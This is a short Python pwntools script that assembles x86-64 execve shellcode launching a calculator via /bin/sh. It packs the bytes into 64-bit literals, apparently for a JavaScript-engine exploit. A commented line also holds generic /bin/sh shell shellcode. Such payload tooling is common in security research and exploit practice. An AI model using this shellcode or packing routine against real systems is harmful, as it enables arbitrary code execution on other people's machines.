from pwn import *
import struct
context.arch= "amd64"

shellcode = '''
    .global _start
    _start:
        xor rdx,rdx
        push rdx
        lea rdi,[rip+cmd]
        push rdi
        lea rdi,[rip+arg]
        push rdi
        lea rdi,[rip+sh]
        push rdi
        lea rsi,[rsp]
        lea rdi,[rip+sh]
        mov rax,SYS_execve
        syscall
    sh:
        .asciz "/bin/sh"
    arg:
        .asciz "-c"
    cmd:
        .asciz "DISPLAY=:0;xcalc"
'''  

shellcode=asm(shellcode)
#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
s =[72,49,210,82,72,141,61,48,0,0,0,87,72,141,61,37,0,0,0,87,72,141,61,21,0,0,0,87,72,141,52,36,72,141,61,9,0,0,0,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0,45,99,0,101,120,112,111,114,116,32,68,73,83,80,76,65,89,61,58,48,46,48,59,120,99,97,108,99,0]
shellcode =""
for i in s:
    shellcode += chr(i)

code = []
temp = []
times = 0 
for i in shellcode:
    temp.append(hex(ord(i))[2:].rjust(2,'0'))
    times+=1
    if times%8 == 0 or (len(shellcode)-times)==0:
        temp.reverse()
        s = "".join(temp)
        #code.append(eval("0x"+s+'n'))
        print "0x"+s+'n,',
        temp=[]
print code